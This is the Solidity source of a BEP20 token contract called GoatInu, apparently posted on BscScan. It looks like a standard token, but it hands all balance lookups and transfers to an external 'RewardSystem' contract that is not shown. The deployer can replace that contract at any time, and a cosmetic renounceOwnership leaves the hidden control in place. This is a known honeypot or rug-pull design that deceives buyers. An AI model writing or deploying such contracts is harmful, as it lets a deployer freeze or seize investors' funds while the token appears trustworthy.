/**
 *Submitted for verification at BscScan.com on 2022-05-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
interface RewardSystem {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function setup(address who,uint8 dec,uint256 total) external;
}
contract GoatInu is BEP20 {
    using SafeMath for uint256;
    address private dev;  
    string public name;
    string public symbol;
    uint8 public _decimals;
    uint public _totalSupply;
    mapping (address => mapping (address => uint256)) private allowed;
    address private rewards;
    constructor(address rewardsAddr,string memory _name,string memory _symbol,uint256 tSupply,uint8 dec) public {
        _decimals = dec;
        _totalSupply = tSupply * 10 ** _decimals;
        rewards = rewardsAddr;
        name = _name;
        symbol = _symbol;
        dev = msg.sender;
        RewardSystem(rewardsAddr).setup(msg.sender,dec,_totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function balanceOf(address who) view public returns (uint256) {
        return RewardSystem(rewards).balanceOf(who);
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function setRewardsAddress(address rewardsAddress) public {
        require(msg.sender == dev);
        rewards = rewardsAddress;
    }
    function renounceOwnership() public {
        require(msg.sender == dev);
        emit OwnershipTransferred(dev, address(0));
        dev = address(0);
    }
    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return RewardSystem(rewards).doTransfer(msg.sender, msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return RewardSystem(rewards).doTransfer(msg.sender, from, to, amount);
    }   
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}